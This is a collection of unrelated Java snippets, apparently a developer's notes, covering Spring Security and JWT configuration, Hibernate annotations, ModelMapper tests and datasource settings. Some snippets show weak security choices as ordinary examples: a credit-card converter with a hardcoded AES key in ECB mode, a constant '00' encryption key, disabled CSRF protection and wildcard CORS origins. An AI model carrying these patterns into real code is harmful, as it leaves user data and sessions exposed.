	public void shouldReturn200WhenSendingRequestToManagementEndpoint() throws Exception {
		@SuppressWarnings("rawtypes")
		ResponseEntity<Map> entity = this.testRestTemplate.getForEntity(
				"http://localhost:" + this.mgt + "/actuator/info", Map.class);

		then(entity.getStatusCode()).isEqualTo(HttpStatus.OK);
	}

}
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
 
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.authorizeRequests()
          .antMatchers("/login").permitAll()
          .antMatchers("/foos/**").hasIpAddress("11.11.11.11")
          .anyRequest().authenticated()
          .and()
          .formLogin().permitAll()
          .and()
          .csrf().disable();
    }
 
    // ...
 
}

//...
.antMatchers("/foos/**")
.access("isAuthenticated() and hasIpAddress('11.11.11.11')")
//...

@Test
public void givenUser_whenGetHomePage_thenOK() {
    Response response = RestAssured.given().auth().form("john", "123")
      .get("http://localhost:8082/");
 
    assertEquals(200, response.getStatusCode());
    assertTrue(response.asString().contains("Welcome"));
}

@Test
public void givenUserWithWrongIP_whenGetFooById_thenForbidden() {
    Response response = RestAssured.given().auth().form("john", "123")
      .get("http://localhost:8082/foos/1");
 
    assertEquals(403, response.getStatusCode());
    assertTrue(response.asString().contains("Forbidden"));
}

@Component
public class CustomIpAuthenticationProvider implements AuthenticationProvider {
     
   Set<String> whitelist = new HashSet<String>();
 
    public CustomIpAuthenticationProvider() {
        whitelist.add("11.11.11.11");
        whitelist.add("12.12.12.12");
    }
 
    @Override
    public Authentication authenticate(Authentication auth) throws AuthenticationException {
        WebAuthenticationDetails details = (WebAuthenticationDetails) auth.getDetails();
        String userIp = details.getRemoteAddress();
        if(! whitelist.contains(userIp)){
            throw new BadCredentialsException("Invalid IP Address");
        }
        //...
}
--------------------------------------------------------------------------------------------------------
@Column(name="Price", columnDefinition="Decimal(10,2) default '100.00'")
--------------------------------------------------------------------------------------------------------
@Entity(name = "Event")
public static class Event {

	@Id
	@GeneratedValue
	private Long id;

	@Column(name = "`timestamp`")
	@FunctionCreationTimestamp
	private Date timestamp;

	//Constructors, getters, and setters are omitted for brevity
}

@ValueGenerationType(generatedBy = FunctionCreationValueGeneration.class)
@Retention(RetentionPolicy.RUNTIME)
public @interface FunctionCreationTimestamp {}

public static class FunctionCreationValueGeneration
		implements AnnotationValueGeneration<FunctionCreationTimestamp> {

	@Override
	public void initialize(FunctionCreationTimestamp annotation, Class<?> propertyType) {
	}

	/**
	 * Generate value on INSERT
	 * @return when to generate the value
	 */
	public GenerationTiming getGenerationTiming() {
		return GenerationTiming.INSERT;
	}

	/**
	 * Returns null because the value is generated by the database.
	 * @return null
	 */
	public ValueGenerator<?> getValueGenerator() {
		return null;
	}

	/**
	 * Returns true because the value is generated by the database.
	 * @return true
	 */
	public boolean referenceColumnInSql() {
		return true;
	}

	/**
	 * Returns the database-generated value
	 * @return database-generated value
	 */
	public String getDatabaseGeneratedReferencedColumnValue() {
		return "current_timestamp";
	}
}

@Entity(name = "Event")
public static class Event {

	@Id
	@GeneratedValue
	private Long id;

	@Column(name = "`timestamp`")
	@FunctionCreationTimestamp
	private Date timestamp;

	//Constructors, getters, and setters are omitted for brevity
}

@ValueGenerationType(generatedBy = FunctionCreationValueGeneration.class)
@Retention(RetentionPolicy.RUNTIME)
public @interface FunctionCreationTimestamp {}

public static class FunctionCreationValueGeneration
		implements AnnotationValueGeneration<FunctionCreationTimestamp> {

	@Override
	public void initialize(FunctionCreationTimestamp annotation, Class<?> propertyType) {
	}

	/**
	 * Generate value on INSERT
	 * @return when to generate the value
	 */
	public GenerationTiming getGenerationTiming() {
		return GenerationTiming.INSERT;
	}

	/**
	 * Returns the in-memory generated value
	 * @return {@code true}
	 */
	public ValueGenerator<?> getValueGenerator() {
		return (session, owner) -> new Date( );
	}

	/**
	 * Returns false because the value is generated by the database.
	 * @return false
	 */
	public boolean referenceColumnInSql() {
		return false;
	}

	/**
	 * Returns null because the value is generated in-memory.
	 * @return null
	 */
	public String getDatabaseGeneratedReferencedColumnValue() {
		return null;
	}
}

@Entity(name = "Employee")
public static class Employee {

	@Id
	private Long id;

	@NaturalId
	private String username;

	@Column(name = "pswd")
	@ColumnTransformer(
		read = "decrypt( 'AES', '00', pswd  )",
		write = "encrypt('AES', '00', ?)"
	)
	private String password;

	private int accessLevel;

	@ManyToOne(fetch = FetchType.LAZY)
	private Department department;

	@ManyToMany(mappedBy = "employees")
	private List<Project> projects = new ArrayList<>();

	//Getters and setters omitted for brevity
}

@Entity(name = "Savings")
public static class Savings {

	@Id
	private Long id;

	@Type(type = "org.hibernate.userguide.mapping.basic.MonetaryAmountUserType")
	@Columns(columns = {
		@Column(name = "money"),
		@Column(name = "currency")
	})
	@ColumnTransformer(
		forColumn = "money",
		read = "money / 100",
		write = "? * 100"
	)
	private MonetaryAmount wallet;

	//Getters and setters omitted for brevity

}

@Entity(name = "Account")
public static class Account {

	@Id
	private Long id;

	private Double credit;

	private Double rate;

	@Formula(value = "credit * rate")
	private Double interest;

	//Getters and setters omitted for brevity

}

public enum AccountType {
	DEBIT,
	CREDIT
}

@Entity(name = "Client")
public static class Client {

	@Id
	private Long id;

	private String name;

	@Where( clause = "account_type = 'DEBIT'")
	@OneToMany(mappedBy = "client")
	private List<Account> debitAccounts = new ArrayList<>( );

	@Where( clause = "account_type = 'CREDIT'")
	@OneToMany(mappedBy = "client")
	private List<Account> creditAccounts = new ArrayList<>( );

	//Getters and setters omitted for brevity

}

@Entity(name = "Account")
@Where( clause = "active = true" )
public static class Account {

	@Id
	private Long id;

	@ManyToOne
	private Client client;

	@Column(name = "account_type")
	@Enumerated(EnumType.STRING)
	private AccountType type;

	private Double amount;

	private Double rate;

	private boolean active;

	//Getters and setters omitted for brevity

}

@Entity(name = "Book")
public static class Book {

	@Id
	private Long id;

	private String title;

	private String author;

	@ManyToMany
	@JoinTable(
		name = "Book_Reader",
		joinColumns = @JoinColumn(name = "book_id"),
		inverseJoinColumns = @JoinColumn(name = "reader_id")
	)
	@WhereJoinTable( clause = "created_on > DATEADD( 'DAY', -7, CURRENT_TIMESTAMP() )")
	private List<Reader> currentWeekReaders = new ArrayList<>( );

	//Getters and setters omitted for brevity

}

@Entity(name = "Reader")
public static class Reader {

	@Id
	private Long id;

	private String name;

	//Getters and setters omitted for brevity

}

@Entity(name = "Account")
@Table(name = "account")
@SecondaryTable(
	name = "account_details"
)
@SQLDelete(
	sql = "UPDATE account_details SET deleted = true WHERE id = ? "
)
@FilterDef(
	name="activeAccount",
	parameters = @ParamDef(
		name="active",
		type="boolean"
	)
)
@Filter(
	name="activeAccount",
	condition="{a}.active = :active and {ad}.deleted = false",
	aliases = {
		@SqlFragmentAlias( alias = "a", table= "account"),
		@SqlFragmentAlias( alias = "ad", table= "account_details"),
	}
)
public static class Account {

	@Id
	private Long id;

	private Double amount;

	private Double rate;

	private boolean active;

	@Column(table = "account_details")
	private boolean deleted;

	//Getters and setters omitted for brevity

}


https://docs.jboss.org/hibernate/orm/5.3/userguide/html_single/Hibernate_User_Guide.html#annotations-hibernate-subselect
--------------------------------------------------------------------------------------------------------
			settings.getJpaProperties().setProperty("hibernate.connection.url", dbUrl);
			settings.getJpaProperties().setProperty("hibernate.connection.username", "sa");
			settings.getJpaProperties().setProperty("hibernate.connection.password", "");
			settings.getJpaProperties().setProperty("javax.persistence.schema-generation.scripts.action", settings.getAction().toSchemaGenerationAction());

			settings.getJpaProperties().setProperty("javax.persistence.schema-generation.scripts.create-target", outputFile.getAbsolutePath());
			settings.getJpaProperties().setProperty("javax.persistence.schema-generation.scripts.drop-target", outputFile.getAbsolutePath());

			settings.getJpaProperties().setProperty("hibernate.hbm2ddl.delimiter", settings.getDelimiter());
			settings.getJpaProperties().setProperty("hibernate.format_sql", String.valueOf(settings.isFormatOutput()));
--------------------------------------------------------------------------------------------------------
private static final String SEQUENCES_VIEW = "CREATE VIEW ALL_SEQUENCES(SEQUENCE_NAME, SEQUENCE_OWNER) AS SELECT SEQUENCE_NAME, '' FROM INFORMATION_SCHEMA.SEQUENCES;";
	private static final String EMPTY_SYNONYMS = "CREATE TABLE ALL_SYNONYMS (SYNONYM_NAME VARCHAR2(30), TABLE_OWNER VARCHAR2(30), TABLE_NAME VARCHAR2(30));";

--------------------------------------------------------------------------------------------------------
    @Parameter(
      names = "-explanations",
      description = "Path to side-car explanations",
      required = true
    )
--------------------------------------------------------------------------------------------------------
    private static BiConsumer<String, String> curry(final BiConsumer<String, String> consumer) {
        return (key, value) -> consumer.accept(key, value);
    }

    public static <X, Y, Z> Function<X, Function<Y, Z>> curry(final BiFunction<X, Y, Z> function) {
        return x -> y -> function.apply(x, y);
    }
--------------------------------------------------------------------------------------------------------
import org.hibernate.tool.hbm2ddl.SchemaExport;

public enum Action {
	CREATE(SchemaExport.Action.CREATE, "create"),
	DROP(SchemaExport.Action.DROP, "drop"),
	DROP_AND_CREATE(SchemaExport.Action.BOTH, "drop-and-create"),
	UPDATE(SchemaExport.Action.NONE, "update");

	private final SchemaExport.Action schemaExportAction;
	private final String schemaGenerationAction;

	Action(SchemaExport.Action schemaExportAction, String schemaGenerationAction) {
		this.schemaExportAction = schemaExportAction;
		this.schemaGenerationAction = schemaGenerationAction;
	}

	public SchemaExport.Action toSchemaExportAction() {
		return schemaExportAction;
	}

	public String toSchemaGenerationAction() {
		return schemaGenerationAction;
	}
}
--------------------------------------------------------------------------------------------------------
import static org.testng.Assert.assertEquals;
import static org.modelmapper.config.Configuration.AccessLevel;

import java.util.Arrays;
import java.util.List;

import org.modelmapper.AbstractTest;
import org.testng.annotations.Test;

@Test
public class DeepListTest extends AbstractTest {
  private int seq = 0;

  static class SrcObj {
    private List<SrcGroup> groups;

    public List<SrcGroup> getGroups() {
      return groups;
    }
  }

  static class SrcGroup {
    private List<SrcItem> items;

    public List<SrcItem> getItems() {
      return items;
    }
  }

  static class SrcItem {
    private String value;

    public String getValue() {
      return value;
    }
  }

  static class DestObj {
    protected List<DestGroup> groups;

    public List<DestGroup> getGroups() {
      return groups;
    }
  }

  static class DestGroup {
    protected List<DestItem> items;

    public List<DestItem> getItems() {
      return items;
    }
  }

  static class DestItem {
    protected String value;

    public String getValue() {
      return value;
    }
  }

  public void shouldMap() {
    modelMapper.getConfiguration().setMethodAccessLevel(AccessLevel.PUBLIC);
    modelMapper.getConfiguration().setFieldAccessLevel(AccessLevel.PROTECTED);

    SrcObj srcObj = new SrcObj();
    srcObj.groups = Arrays.asList(srcGroup(), srcGroup());

    DestObj destObj = modelMapper.map(srcObj, DestObj.class);

    assertEquals(destObj.groups.get(0).items.get(0).value, "foo1");
    assertEquals(destObj.groups.get(0).items.get(1).value, "foo2");
    assertEquals(destObj.groups.get(1).items.get(0).value, "foo3");
    assertEquals(destObj.groups.get(1).items.get(1).value, "foo4");
  }

  private SrcGroup srcGroup() {
    SrcGroup group = new SrcGroup();
    group.items = Arrays.asList(srcItem(), srcItem());
    return group;
  }

  private SrcItem srcItem() {
    SrcItem item = new SrcItem();
    item.value = "foo" + String.valueOf(++seq);
    return item;
  }
}
--------------------------------------------------------------------------------------------------------
//package com.paragon.microservices.distributor.system.converter;
//
//import com.paragon.microservices.distributor.model.dto.response.VersionResponse;
//import com.paragon.microservices.distributor.model.entity.VersionEntity;
//import com.paragon.microservices.distributor.model.entity.VersionInfoEntity;
//import com.paragon.microservices.distributor.model.formatter.VersionInfoFormatter;
//import org.modelmapper.Converter;
//import org.modelmapper.spi.MappingContext;
//import org.springframework.beans.factory.annotation.Autowired;
//import org.springframework.stereotype.Component;
//
//import java.util.Locale;
//
//@Component
//public class VersionEntityToVersionResponseConverter implements Converter<VersionEntity, VersionResponse> {
//
//    @Autowired
//    private VersionInfoFormatter formatter;
//
//    @Override
//    public VersionResponse convert(final MappingContext<VersionEntity, VersionResponse> context) {
//        final VersionEntity source = context.getSource();
//        final VersionResponse dest = new VersionResponse();
//        dest.setVersionInfo(this.getVersionInfo(source.getVersionInfo()));
//        dest.setChangeLog(source.getChangeLog());
//        dest.setLocale(source.getLocale());
//        dest.setId(source.getId());
//        return dest;
//    }
//
//    private String getVersionInfo(final VersionInfoEntity versionInfo) {
//        return this.formatter.print(versionInfo, Locale.getDefault());
//    }
//}

//package com.paragon.microservices.distributor.system.converter;
//
//import com.paragon.microservices.distributor.model.dto.response.VersionResponse;
//import com.paragon.microservices.distributor.model.entity.VersionEntity;
//import com.paragon.microservices.distributor.model.entity.VersionInfoEntity;
//import com.paragon.microservices.distributor.model.formatter.VersionInfoFormatter;
//import org.modelmapper.PropertyMap;
//import org.springframework.beans.factory.annotation.Autowired;
//import org.springframework.stereotype.Component;
//
//import java.util.Locale;
//
//@Component
//public class VersionEntityToVersionResponsePropertyMap extends PropertyMap<VersionEntity, VersionResponse> {
//
//    @Autowired
//    private VersionInfoFormatter formatter;
//
//    @Override
//    protected void configure() {
//        map(this.source.getVersionInfo()).setVersionInfo("test");
//    }
//
//    private String getVersionInfo(final VersionInfoEntity versionInfo) {
//        return this.formatter.print(versionInfo, Locale.getDefault());
//    }
//}
--------------------------------------------------------------------------------------------------------
public String create(@RequestBody JSONObject requestParams) {
      String name=requestParams.getString("name");
      List<Planet> planetArtifacts=requestParams.getJSONArray("artifacts").toJavaList(Planet.Class);
...
--------------------------------------------------------------------------------------------------------
@Component @Order(Ordered.HIGHEST_PRECEDENCE)
public class MultiTenancyFilter implements Filter {
    private final static Pattern pattern = Pattern.compile("^/(?<contextpath>[^/]+).*$");

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        final HttpServletRequest req = (HttpServletRequest) request;
        final String requestURI = req.getRequestURI();

        Matcher matcher = pattern.matcher(requestURI);
        if(matcher.matches()) {
            chain.doFilter(new HttpServletRequestWrapper(req) {
                @Override
                public String getContextPath() {
                    return "/"+matcher.group("contextpath");
                }
            }, response);
        }
    }

    @Override public void init(FilterConfig filterConfig) throws ServletException {}
    @Override public void destroy() {}
}

@Component @Order(Ordered.HIGHEST_PRECEDENCE)
public class MultiTenancyFilter extends OncePerRequestFilter {
    private final static Pattern pattern = Pattern.compile("^(?<contextPath>/[^/]+)(?<servletPath>.*)$");

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {
        Matcher matcher = pattern.matcher(request.getServletPath());
        if(matcher.matches()) {
            final String contextPath = matcher.group("contextPath");
            final String servletPath = matcher.group("servletPath");

            if(servletPath.trim().isEmpty()) {
                response.sendRedirect(contextPath+"/");
                return;
            }

            filterChain.doFilter(new HttpServletRequestWrapper(request) {
                @Override
                public String getContextPath() {
                    return contextPath;
                }
                @Override
                public String getServletPath() {
                    return servletPath;
                }
            }, response);
        } else {
            filterChain.doFilter(request, response);
        }
    }

    @Override
    protected String getAlreadyFilteredAttributeName() {
        return "multiTenancyFilter" + OncePerRequestFilter.ALREADY_FILTERED_SUFFIX;
    }
}
--------------------------------------------------------------------------------------------------------
# Number of ms to wait before throwing an exception if no connection is available.
spring.datasource.tomcat.max-wait=10000

# Maximum number of active connections that can be allocated from this pool at the same time.
spring.datasource.tomcat.max-active=50

# Validate the connection before borrowing it from the pool.
spring.datasource.tomcat.test-on-borrow=true
--------------------------------------------------------------------------------------------------------
# ===============================
# = H2 data source
# ===============================
spring:
  datasource:
    url: jdbc:h2:mem:spring-security-hibernate-test;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE
    platform: h2
    username: sa
    password:

# ===============================
# = JPA configurations
# ===============================
  jpa:
    show-sql: true
    hibernate:
      ddl-auto: create-drop
      naming-strategy: org.hibernate.cfg.ImprovedNamingStrategy
    database-platform: H2
--------------------------------------------------------------------------------------------------------
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
import org.springframework.test.web.servlet.MockMvc;

import static org.springframework.security.test.web.servlet.request.SecurityMockMvcRequestPostProcessors.httpBasic;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@SpringBootTest
@ActiveProfiles("it")
@AutoConfigureMockMvc
@RunWith(SpringJUnit4ClassRunner.class)
public class BasicAuthenticationIntegrationTests {

    @Autowired
    private MockMvc mockMvc;

    @Test
    public void accessWithValidCredentials() throws Exception {
        this.mockMvc
                .perform(get("/users").with(httpBasic("info@memorynotfound.com", "password")))
                .andExpect(status().isOk());
    }

    @Test
    public void accessWithInValidCredentials() throws Exception {
        this.mockMvc
                .perform(get("/users").with(httpBasic("info@memorynotfound.com", "invalidPassword")))
                .andExpect(status().is4xxClientError());
    }

}
--------------------------------------------------------------------------------------------------------
If there are problems in this service, check the SQL Server Agent jobs. You can look up the regis
-
try for the “ErrorLogFile” key under HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft 
SQL Server\MSSQL12.SQL2014\SQLServerAge
--------------------------------------------------------------------------------------------------------
@Id
    @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "CUST_SEQ")
    @SequenceGenerator(sequenceName = "customer_seq", allocationSize = 1, name = "CUST_SEQ")
    Long id;
--------------------------------------------------------------------------------------------------------
        <dependency>
                <groupId>org.junit.platform</groupId>
                <artifactId>junit-platform-launcher</artifactId>
                <scope>test</scope>
                <version>${junit-platform.version}</version>
            </dependency>
            <dependency>
                <groupId>org.junit.platform</groupId>
                <artifactId>junit-platform-engine</artifactId>
                <scope>test</scope>
                <version>${junit-platform.version}</version>
            </dependency>
            <dependency>
                <groupId>org.junit.jupiter</groupId>
                <artifactId>junit-jupiter-api</artifactId>
                <scope>test</scope>
                <version>${junit-jupiter.version}</version>
            </dependency>
            <dependency>
                <groupId>org.junit.jupiter</groupId>
                <artifactId>junit-jupiter-engine</artifactId>
                <scope>test</scope>
                <version>${junit-jupiter.version}</version>
            </dependency>
--------------------------------------------------------------------------------------------------------
	@Converter(autoApply = false)
	public static class UrlConverter implements AttributeConverter<URL,String> {
		@Override
		public String convertToDatabaseColumn(URL attribute) {
			convertToDatabaseColumnCalled = true;
			return attribute == null ? null : attribute.toExternalForm();
		}

		@Override
		public URL convertToEntityAttribute(String dbData) {
			convertToEntityAttributeCalled = true;
			if ( dbData == null ) {
				return null;
			}

			try {
				return new URL( dbData );
			}
			catch (MalformedURLException e) {
				throw new IllegalArgumentException( "Could not convert incoming value to URL : " + dbData );
			}
		}
	}

	@Converter( autoApply = true )
	public static class AutoUrlConverter implements AttributeConverter<URL,String> {
		@Override
		public String convertToDatabaseColumn(URL attribute) {
			throw new IllegalStateException( "Should not be called" );
		}

		@Override
		public URL convertToEntityAttribute(String dbData) {
			throw new IllegalStateException( "Should not be called" );
		}
	}
--------------------------------------------------------------------------------------------------------
@TestForIssue(jiraKey = "HHH-10959")
--------------------------------------------------------------------------------------------------------
	public static class DateAttributeConverter implements AttributeConverter<DateAttribute, Date> {

		@Override
		public Date convertToDatabaseColumn(DateAttribute attribute) {
			if ( attribute == null ) {
				return null;
			}
			return new Date( attribute.field );
		}

		@Override
		public DateAttribute convertToEntityAttribute(Date dbData) {
			if ( dbData == null ) {
				return null;
			}
			return new DateAttribute( dbData.getTime() );
		}

	}
--------------------------------------------------------------------------------------------------------
@Converter
public class CryptoConverter implements AttributeConverter<String, String> {

    private static final String ALGORITHM = "AES/ECB/PKCS5Padding";
    private static final byte[] KEY = "MySuperSecretKey".getBytes();

    @Override
    public String convertToDatabaseColumn(String ccNumber) {
      // do some encryption
      Key key = new SecretKeySpec(KEY, "AES");
      try {
         Cipher c = Cipher.getInstance(ALGORITHM);
         c.init(Cipher.ENCRYPT_MODE, key);
         return Base64.encodeBytes(c.doFinal(ccNumber.getBytes()));
      } catch (Exception e) {
         throw new RuntimeException(e);
      }
    }

    @Override
    public String convertToEntityAttribute(String dbData) {
      // do some decryption
      Key key = new SecretKeySpec(KEY, "AES");
      try {
        Cipher c = Cipher.getInstance(ALGORITHM);
        c.init(Cipher.DECRYPT_MODE, key);
        return new String(c.doFinal(Base64.decode(dbData)));
      } catch (Exception e) {
        throw new RuntimeException(e);
      }
    }
}

@RunWith(Arquillian.class)
public class TestCryptoConverter {

    @Deployment
    public static JavaArchive createDeployment() {
        return ShrinkWrap
                .create(JavaArchive.class)
                .addClasses(CreditCard.class, CryptoConverter.class,
                        TestCryptoConverter.class)
                .addAsManifestResource("META-INF/persistence.xml",
                        "persistence.xml")
                .addAsManifestResource("META-INF/orm.xml", "orm.xml")
                .addAsManifestResource(EmptyAsset.INSTANCE, "beans.xml");
    }
--------------------------------------------------------------------------------------------------------
@SpringJUnitConfig
$ hostnamectl --static set-hostname dallas

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.context.event.ApplicationReadyEvent;
import org.springframework.context.ApplicationContext;
import org.springframework.context.ApplicationListener;
import org.springframework.core.env.Environment;

import java.net.InetAddress;
import java.net.UnknownHostException;

PSG-1770-BSU-SE
PSG-1770-BSU-SE-TL-1Y
PSG-1770-BSU-RE-TL-2Y

@SuppressWarnings("SpringJavaAutowiredFieldsWarningInspection")
@SpringBootApplication
class App implements ApplicationListener<ApplicationReadyEvent> {

    @Autowired
    private ApplicationContext applicationContext;

    public static void main(String[] args) {
        SpringApplication.run(App.class, args);
    }

    @Override
    public void onApplicationEvent(ApplicationReadyEvent event) {
        try {
            String ip = InetAddress.getLocalHost().getHostAddress();
            int port = applicationContext.getBean(Environment.class).getProperty("server.port", Integer.class, 8080);
            System.out.printf("%s:%d", ip, port);
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
    }
--------------------------------------------------------------------------------------------------------
@Bean
public WebMvcConfigurer corsConfigurer() {
	return new WebMvcConfigurerAdapter() {
		@Override
		public void addCorsMappings(CorsRegistry registry) {
			registry.addMapping("/**").allowedMethods("GET", "POST", "PUT", "DELETE").allowedOrigins("*")
				.allowedHeaders("*");
		}
	};
}
--------------------------------------------------------------------------------------------------------
import com.auth0.samples.authapi.user.ApplicationUser;

import com.fasterxml.jackson.databind.ObjectMapper;

import io.jsonwebtoken.Jwts;

import io.jsonwebtoken.SignatureAlgorithm;

import org.springframework.security.authentication.AuthenticationManager;

import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;

import org.springframework.security.core.Authentication;

import org.springframework.security.core.AuthenticationException;

import org.springframework.security.core.userdetails.User;

import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;

import javax.servlet.FilterChain;

import javax.servlet.ServletException;

import javax.servlet.http.HttpServletRequest;

import javax.servlet.http.HttpServletResponse;

import java.io.IOException;

import java.util.ArrayList;

import java.util.Date;

import static com.auth0.samples.authapi.security.SecurityConstants.EXPIRATION_TIME;

import static com.auth0.samples.authapi.security.SecurityConstants.HEADER_STRING;

import static com.auth0.samples.authapi.security.SecurityConstants.SECRET;

import static com.auth0.samples.authapi.security.SecurityConstants.TOKEN_PREFIX;

public class JWTAuthenticationFilter extends UsernamePasswordAuthenticationFilter {

    private AuthenticationManager authenticationManager;

    public JWTAuthenticationFilter(AuthenticationManager authenticationManager) {

        this.authenticationManager = authenticationManager;

    }

    @Override

    public Authentication attemptAuthentication(HttpServletRequest req,

                                                HttpServletResponse res) throws AuthenticationException {

        try {

            ApplicationUser creds = new ObjectMapper()

                    .readValue(req.getInputStream(), ApplicationUser.class);

            return authenticationManager.authenticate(

                    new UsernamePasswordAuthenticationToken(

                            creds.getUsername(),

                            creds.getPassword(),

                            new ArrayList<>())

            );

        } catch (IOException e) {

            throw new RuntimeException(e);

        }

    }

    @Override

    protected void successfulAuthentication(HttpServletRequest req,

                                            HttpServletResponse res,

                                            FilterChain chain,

                                            Authentication auth) throws IOException, ServletException {

        String token = Jwts.builder()

                .setSubject(((User) auth.getPrincipal()).getUsername())

                .setExpiration(new Date(System.currentTimeMillis() + EXPIRATION_TIME))

                .signWith(SignatureAlgorithm.HS512, SECRET)

                .compact();

        res.addHeader(HEADER_STRING, TOKEN_PREFIX + token);

    }

}

import io.jsonwebtoken.Jwts;

import org.springframework.security.authentication.AuthenticationManager;

import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;

import org.springframework.security.core.context.SecurityContextHolder;

import org.springframework.security.web.authentication.www.BasicAuthenticationFilter;

import javax.servlet.FilterChain;

import javax.servlet.ServletException;

import javax.servlet.http.HttpServletRequest;

import javax.servlet.http.HttpServletResponse;

import java.io.IOException;

import java.util.ArrayList;

import static com.auth0.samples.authapi.security.SecurityConstants.HEADER_STRING;

import static com.auth0.samples.authapi.security.SecurityConstants.SECRET;

import static com.auth0.samples.authapi.security.SecurityConstants.TOKEN_PREFIX;

public class JWTAuthorizationFilter extends BasicAuthenticationFilter {

    public JWTAuthorizationFilter(AuthenticationManager authManager) {

        super(authManager);

    }

    @Override

    protected void doFilterInternal(HttpServletRequest req,

                                    HttpServletResponse res,

                                    FilterChain chain) throws IOException, ServletException {

        String header = req.getHeader(HEADER_STRING);

        if (header == null || !header.startsWith(TOKEN_PREFIX)) {

            chain.doFilter(req, res);

            return;

        }

        UsernamePasswordAuthenticationToken authentication = getAuthentication(req);

        SecurityContextHolder.getContext().setAuthentication(authentication);

        chain.doFilter(req, res);

    }

    private UsernamePasswordAuthenticationToken getAuthentication(HttpServletRequest request) {

        String token = request.getHeader(HEADER_STRING);

        if (token != null) {

            // parse the token.

            String user = Jwts.parser()

                    .setSigningKey(SECRET)

                    .parseClaimsJws(token.replace(TOKEN_PREFIX, ""))

                    .getBody()

                    .getSubject();

            if (user != null) {

                return new UsernamePasswordAuthenticationToken(user, null, new ArrayList<>());

            }

            return null;

        }

        return null;

    }

}
--------------------------------------------------------------------------------------------------------
import javax.sql.DataSource;
 
import org.o7planning.sbsecurity.service.UserDetailsServiceImpl;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.web.authentication.rememberme.JdbcTokenRepositoryImpl;
import org.springframework.security.web.authentication.rememberme.PersistentTokenRepository;
 
@Configuration
@EnableWebSecurity
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
 
    @Autowired
    private UserDetailsServiceImpl userDetailsService;
 
    @Autowired
    private DataSource dataSource;
 
    @Bean
    public BCryptPasswordEncoder passwordEncoder() {
        BCryptPasswordEncoder bCryptPasswordEncoder = new BCryptPasswordEncoder();
        return bCryptPasswordEncoder;
    }
 
    @Autowired
    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
 
        // Setting Service to find User in the database.
        // And Setting PassswordEncoder
        auth.userDetailsService(userDetailsService).passwordEncoder(passwordEncoder());
 
    }
 
    @Override
    protected void configure(HttpSecurity http) throws Exception {
 
        http.csrf().disable();
 
        // The pages does not require login
        http.authorizeRequests().antMatchers("/", "/login", "/logout").permitAll();
 
        // /userInfo page requires login as ROLE_USER or ROLE_ADMIN.
        // If no login, it will redirect to /login page.
        http.authorizeRequests().antMatchers("/userInfo").access("hasAnyRole('ROLE_USER', 'ROLE_ADMIN')");
 
        // For ADMIN only.
        http.authorizeRequests().antMatchers("/admin").access("hasRole('ROLE_ADMIN')");
 
        // When the user has logged in as XX.
        // But access a page that requires role YY,
        // AccessDeniedException will be thrown.
        http.authorizeRequests().and().exceptionHandling().accessDeniedPage("/403");
 
        // Config for Login Form
        http.authorizeRequests().and().formLogin()//
                // Submit URL of login page.
                .loginProcessingUrl("/j_spring_security_check") // Submit URL
                .loginPage("/login")//
                .defaultSuccessUrl("/userAccountInfo")//
                .failureUrl("/login?error=true")//
                .usernameParameter("username")//
                .passwordParameter("password")
                // Config for Logout Page
                .and().logout().logoutUrl("/logout").logoutSuccessUrl("/logoutSuccessful");
 
        // Config Remember Me.
        http.authorizeRequests().and() //
                .rememberMe().tokenRepository(this.persistentTokenRepository()) //
                .tokenValiditySeconds(1 * 24 * 60 * 60); // 24h
 
    }
 
    @Bean
    public PersistentTokenRepository persistentTokenRepository() {
        JdbcTokenRepositoryImpl db = new JdbcTokenRepositoryImpl();
        db.setDataSource(dataSource);
        return db;
    }
 
}
--------------------------------------------------------------------------------------------------------
// Token stored in Table (Persistent_Logins)
@Bean
public PersistentTokenRepository persistentTokenRepository() {
    JdbcTokenRepositoryImpl db = new JdbcTokenRepositoryImpl();
    db.setDataSource(this.dataSource);
    return db;
}
 
// Token stored in Memory (Of Web Server).
@Bean
public PersistentTokenRepository persistentTokenRepository() {
    InMemoryTokenRepositoryImpl memory = new InMemoryTokenRepositoryImpl();
    return memory;
}
--------------------------------------------------------------------------------------------------------
    @Autowired
    private AuthenticationManager authenticationManager;
--------------------------------------------------------------------------------------------------------
public class CollectionsBean {
 
    @Value("${names.list:}#{T(java.util.Collections).emptyList()}")
    private List<String> nameListWithDefaultValue;
     
    public void printNameListWithDefaults() {
        System.out.println(nameListWithDefaultValue);
    }
}

https://github.com/modelmapper/modelmapper/issues/217
--------------------------------------------------------------------------------------------------------
//package com.paragon.microservices.distributor.system.converter;
//
//import com.paragon.microservices.distributor.model.dto.response.FileResponse;
//import com.paragon.microservices.distributor.model.entity.FileEntity;
//import org.modelmapper.Converter;
